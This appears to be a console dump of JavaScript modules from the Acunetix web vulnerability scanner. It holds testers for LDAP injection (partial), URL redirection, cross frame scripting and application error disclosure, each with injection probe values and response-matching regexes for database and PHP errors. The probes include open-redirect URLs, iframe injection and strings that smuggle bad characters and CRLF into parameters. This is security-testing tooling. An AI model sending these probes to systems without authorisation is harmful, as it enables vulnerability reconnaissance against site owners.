				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForLDAPInjection(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayLDAPInjectionTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}


//register the tester object
LDAPInjectionTester.register();

VM894:25 /*
Author:		Blade
Purpose:	URL redirection test
*/

var URLRedirectionTester						= new classGenericTester();
URLRedirectionTester.strXULMenuId				= "acunetix_testtype_URLRedirection";
URLRedirectionTester.strXULMenuText				= "URL Redirection";
URLRedirectionTester.strXULMenuHint				= "Scan for URL Redirection";
URLRedirectionTester.strXULMenuAccesskey		= "R";
URLRedirectionTester.strType					= "URL Redirection";
URLRedirectionTester.strTestName				= "URL Redirection";
URLRedirectionTester.severity					= "Info";
URLRedirectionTester.strDescription				= "http://www.acunetix.com/websitesecurity/";
URLRedirectionTester.wvsCorelationID			= "URL_redirection.xml";
URLRedirectionTester.enabled				= false;
/*IMPLEMENTATION*/
URLRedirectionTester.enabled				= true;

function searchForURLRedirection(objTaskResult, objTestClass)
{
	
	if 	(objTaskResult.intReponseStatus == 200)
	{
		var strFilteredResponseText = objTaskResult.strResponseText;
		
		objTestClass.loadStringInToTheHTMLParser(strFilteredResponseText,["filterRedirect", "filterScript", "silentAlert"]);
		
		var boolRetval = objTestClass.htmlParserTestForTag("metax",Array("http-equiv=refresh","content>url=http://www.acunetix.com"));
		return(boolRetval);
	}
	if 	((objTaskResult.intReponseStatus == 301) || (objTaskResult.intReponseStatus == 302)) {
			// test the location
			var strLocation = /Location\s*:\s*http:\/\/(www.acunetix.com)/i.exec(objTaskResult.strResponseHeader);			
			// check for match
			if ((strLocation == null) || (strLocation.length <=1 )) return(false);
	
			if (strLocation[1] == "www.acunetix.com") {
				return(true);	
			}
	}
	
	return(false);
}

URLRedirectionTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayURLRedirectionTestValues = new Array
	(
		"http://www.acunetix.com"					//	Simple
	)
	
		
	//request result container	
	this.objTaskResult = objCallerClass.objTaskResult;
		
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
				
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> URLRedirectionTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayURLRedirectionTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array(),
						intRedirectionLimit			: 0,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForURLRedirection(this.parent.objTaskResult, this.parent))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}
				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayURLRedirectionTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}


//register the tester object
URLRedirectionTester.register();

VM894:26 /*
Author:		Blade
Purpose:	The cross frame scripting test
*/

var CrossFrameScriptingTester						= new classGenericTester();
CrossFrameScriptingTester.strXULMenuId				= "acunetix_testtype_CrossFrameScripting";
CrossFrameScriptingTester.strXULMenuText			= "Cross Frame Scripting";
CrossFrameScriptingTester.strXULMenuHint			= "Scan for Cross Frame Scripting";
CrossFrameScriptingTester.strXULMenuAccesskey		= "F";
CrossFrameScriptingTester.strType					= "Cross Frame Scripting";
CrossFrameScriptingTester.strTestName				= "Cross Frame Scripting";
CrossFrameScriptingTester.severity					= "Medium";
CrossFrameScriptingTester.strDescription			= "http://www.acunetix.com/websitesecurity/";
CrossFrameScriptingTester.wvsCorelationID			= "Cross_Frame_Scripting.xml";
CrossFrameScriptingTester.enabled					= false;
/*IMPLEMENTATION*/
CrossFrameScriptingTester.enabled					= true;

function searchForCrossFrameScripting(objTaskResult, objTestClass)
{
	if 	(objTaskResult.intReponseStatus == 200)
	{
		objTestClass.loadStringInToTheHTMLParser(objTaskResult.strResponseText, ["filterRedirect", "silentAlert"]);
		
		// check for frame 
		if (objTestClass.htmlParserTestForTag("frame",Array("src=http://www.acunetix-long-name-with-some-inexistent-host.acunetix.com/"))) 
		return(true);	
		
		// check for iframe 		
		if (objTestClass.htmlParserTestForTag("iframe",Array("src=http://www.acunetix-long-name-with-some-inexistent-host.acunetix.com/"))) 
		return(true);	
	}
	
	return(false);
}

CrossFrameScriptingTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	
	//injected values				  
	this.arrayCrossFrameScriptingTestValues = new Array
	(
		"http://www.acunetix-long-name-with-some-inexistent-host.acunetix.com/"					//	Simple
	)
	
		
	//request result container	
	this.objTaskResult = this.objCallerClass.objTaskResult;
		
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
		
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> CrossFrameScriptingTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayCrossFrameScriptingTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array(),
						intRedirectionLimit			: 0,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForCrossFrameScripting(this.parent.objTaskResult, this.parent))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}
				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayCrossFrameScriptingTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}


//register the tester object
CrossFrameScriptingTester.register();

VM894:27 /*
Author:		Blade
Purpose:	Application error test
*/

var ApplicationErrorTester					= new classGenericTester();
ApplicationErrorTester.strXULMenuId			= "acunetix_testtype_ApplicationError";
ApplicationErrorTester.strXULMenuText		= "Application Error Message";
ApplicationErrorTester.strXULMenuHint		= "Scan for Application Error Messages";
ApplicationErrorTester.strXULMenuAccesskey	= "A";
ApplicationErrorTester.strType				= "Application Error Message";
ApplicationErrorTester.strTestName			= "Application Error Message";
ApplicationErrorTester.severity				= "Low";
ApplicationErrorTester.strDescription		= "http://www.acunetix.com/websitesecurity/";
ApplicationErrorTester.wvsCorelationID		= "Application_error.xml";
ApplicationErrorTester.enabled				= false;
/*IMPLEMENTATION*/
ApplicationErrorTester.enabled				= true;

function searchForApplicationError(strInputText, boolJustReturnOnFirstError)
{
	if (boolJustReturnOnFirstError == null) boolJustReturnOnFirstError = false;
	var retval = new Array();
	
	arrayInjectionTestConditions = new Array
	(
		new Array({regex : /(Line\s\d+:\sIncorrect\ssyntax\snear\s'[^']*')/i, condition : true}),
		new Array({regex : /(pg_query\(\)[:]*\squery\sfailed:\serror:\s)/i, condition : true}),
		new Array({regex : /('[^']*'\sis\snull\sor\snot\san\sobject)/i, condition : true}),
		new Array({regex : /(ORA-\d{4,5}:\s)/i, condition : true}),
		new Array({regex : /(Microsoft\sJET\sDatabase\sEngine\s\([^\)]*\)<br>Syntax\serror(.*)\sin\squery\sexpression\s'.*\.<br><b>.*,\sline\s\d+<\/b><br>)/i, condition : true}),
		new Array({regex : /(<h2>\s<i>Syntax\serror\s(\([^\)]*\))?(in\sstring)?\sin\squery\sexpression\s'[^\.]*\.<\/i>\s<\/h2><\/span>)/i, condition : true}),
		new Array({regex : /(<font\sface=\"Arial\"\ssize=2>Syntax\serror\s(.*)?in\squery\sexpression\s'(.*)\.<\/font>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:\s\spg_exec\(\)\s\[\<a\shref='function.pg\-exec\'\>function\.pg-exec\<\/a>\]\:\sQuery failed:\sERROR:\s\ssyntax error at or near \&quot\;\\\&quot; at character \d+ in\s<b>.*<\/b>)/i, condition : true}),
		new Array({regex : /(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\s\([^)]*?\)\sin\squery\sexpression\s.*)/i, condition : true}),
		new Array({regex : /(System\.Data\.OleDb\.OleDbException\:\sSyntax\serror\sin\sstring\sin\squery\sexpression\s)/i, condition : true}),
		new Array({regex : /(<font style="COLOR: black; FONT: 8pt\/11pt verdana">\s+(\[Macromedia\]\[SQLServer\sJDBC\sDriver\]\[SQLServer\]|Syntax\serror\sin\sstring\sin\squery\sexpression\s))/i, condition : true}),
		new Array({regex : /(The Error Occurred in <b>(.*): line.*<\\\/b><br>)/i, condition : true}),
		new Array({regex : /(The error occurred while processing.*Template: (.*) <br>.)/i, condition : true}),
		new Array({regex : /(The error occurred while processing.*in the template file (.*)\.<\\\/p><br>)/i, condition : true}),
		new Array({regex : /(<span><H1>Server\sError\sin\s'[^']*'\sApplication\.<hr\swidth=100%\ssize=1\scolor=silver><\/H1>)/i, condition : true}),
		new Array({regex : /(<title>Invalid\sfile\sname\sfor\smonitoring:\s'([^']*)'\.\sFile\snames\sfor\smonitoring\smust\shave\sabsolute\spaths\,\sand\sno\swildcards\.<\/title>)/i, condition : true}),
		new Array({regex : /(<b>(Warning|Parse\serror|Fatal\serror)<\/b>:.*<b>([^<]*)<\/b>\son\sline\s<b>[0-9]*<\/b><br)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:(?:(?:\s*?main\(\))|(?:\s*?include\(\) \[<a href='function.include'>function.include<\/a>\])): Failed opening '.*?' for inclusion \(include_path='.*?'\) in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:(?:(?:\s*?main\(\))|(?:\s*?include_once\(\) \[<a href='function.include'>function.include<\/a>\])): Failed opening '.*?' for inclusion \(include_path='.*?'\) in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:(?:(?:\s*?main\(\))|(?:\s*?require\(\) \[<a href='function.require'>function.require<\/a>\])): Failed opening required '.*?' \(include_path='.*?'\) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:(?:(?:\s*?main\(\))|(?:\s*?require_once\(\) \[<a href='function.require'>function.require<\/a>\])): Failed opening required '.*?' \(include_path='.*?'\) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  (file_get_contents\(.*?\)( \[<a href='function.file-get-contents'>function.file-get-contents<\/a>\])?|fopen\(.*?\)( \[<a href='function.fopen'>function.fopen<\/a>\])?): failed to open stream: (No such file or directory|Invalid argument) in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:  Call to undefined function.*?\(\) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:  Call to a member function.*?(\(\) )?on a non-object in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:  Call to undefined(?:(?: method)|(?: function:)).*?\(\) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Parse error<\/b>:  parse error, unexpected .*? in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Fatal error<\/b>:  Class (?:(?:'.*?' not found)|(?:.*?:  Cannot inherit from undefined class .*?)) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  virtual\(\)(?:(?: \[<a href='function.virtual'>function.virtual<\/a>\]: Unable to include '.*?' - request execution failed)|(?:: Failed opening '.*?' for inclusion \(include_path='.*?'\))) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  mysql_connect\(\)( \[<a href='function.mysql-connect'>function.mysql-connect<\/a>\])?: Unknown MySQL server host '.*?' (?:(?:\(11001\))|(?:\(1\))) in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  mysql_connect\(\)(?:(?:)|(?: \[<a href='function.mysql-connect'>function.mysql-connect<\/a>\])): Access denied for user '.*?' \(using password: (?:YES|NO)\) in <b>.*?<\/b>  on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:\s+(?:mysql_fetch_array|mysql_fetch_row|mysql_fetch_object|mysql_fetch_field|mysql_fetch_lengths|mysql_num_rows)\(\): supplied argument is not a valid MySQL result resource in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /(<b>Warning<\/b>:  Wrong parameter count for .*?\(\) in <b>.*?<\/b> on line <b>.*?<\/b>)/i, condition : true}),
		new Array({regex : /((?:Unknown database '.*?')|(?:No database selected)|(?:Table '.*?' doesn't exist)|(?:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*?' at line .*?))/i, condition : true})		
	);
				  
	for( var i = 0; i < arrayInjectionTestConditions.length; i++)
	{
		var boolBondition = true;
		for(var j = 0; j < arrayInjectionTestConditions[i].length; j++)
		{
			var match = (arrayInjectionTestConditions[i][j].regex.exec(strInputText) != null);
			if(match != arrayInjectionTestConditions[i][j].condition)
			{
				boolBondition = false;
				break;
			}
		}
		
		if (boolBondition)
		{
			if (boolJustReturnOnFirstError)
				return(true);
			retval.push(i);
		}
	}
	if (boolJustReturnOnFirstError)
		return(false);
	else
		return(retval);
}

ApplicationErrorTester.doTest = function(objCallerClass)
{
	this.objCallerClass		= objCallerClass;
	this.objTaskResult 		= objCallerClass.objTaskResult;
	
	//injected values				  
	this.arrayApplicationErrorTestValues = new Array
	(
		" ",							// Empty
		"268435455",					// Big number
		"-268435455",					// Negative
		"\'\");|]*{%0d%0a<%00",			// Bad chars
		"0",							// Zero
		"NULL",							// NULL
		"0x3fffffff",					// HexBig1
		"0x80000000",					// HexBig2
		"0x7fffffff",					// HexBig3
		"0xffffffff",					// HexBig4
		"-1.0",							// Negative2
		"65536" 						// Misc1
	)	
		
	
	//the tasck calback class with notify function for be used with timer call
	this.fncTaskCallBack =
	{
		intStep				: 0,
		boolRequestPhase	: true,
		strTestString		: Math.floor(Math.random()*1345670),
				
		notify 	: function(timer)
		{
			this.doTest();
		},
		
		doTest : function()
		{
			if(this.parent.objCallerClass.boolTesterMarkedToDie)
			{
				logToFile("=> ApplicationErrorTester => doTest: userAbortRequest detected (boolAbortScan = true)");
				return;
			}
			
			if(this.boolRequestPhase)
			{
				this.boolRequestPhase = false;
				this.parent.doRequestJson(
					{
						objCallerClass 				: this.parent,
						strTestString				: this.parent.arrayApplicationErrorTestValues[this.intStep],
						arrayAcceptedContentTypes 	: new Array(),
						intRedirectionLimit			: 10,
						boolDeleteOriginalCookie	: true,
						boolDeleteOriginalHeaders	: false,
						intEscapeMethod				: 0
					});
				return;
			}
			else
			{
				LogHTTPToFile(this.parent.objTaskResult, false);
				
				if(this.parent.objTaskResult.intErrorCode == 0)
				{
					if(searchForApplicationError(this.parent.objTaskResult.strResponseText,true))
					{
						this.parent.fncExitTest(true, this.parent.strXULMenuText);
						return;
					}

				}
				
				this.boolRequestPhase = true;
				this.intStep ++;
				if(this.intStep >= this.parent.arrayApplicationErrorTestValues.length)
				{
					this.parent.fncExitTest(false);
					return;
				}
				//retrigger the test procedure
				this.doTest();
				return;
			}
		}
	}
	
	//we have to specify fncTaskCallBack parrent since it will be called from other scope
	this.fncTaskCallBack.parent	= this;
	
	//initialize the test procedure
	this.fncTaskCallBack.doTest();
	
}


//register the tester object
ApplicationErrorTester.register();
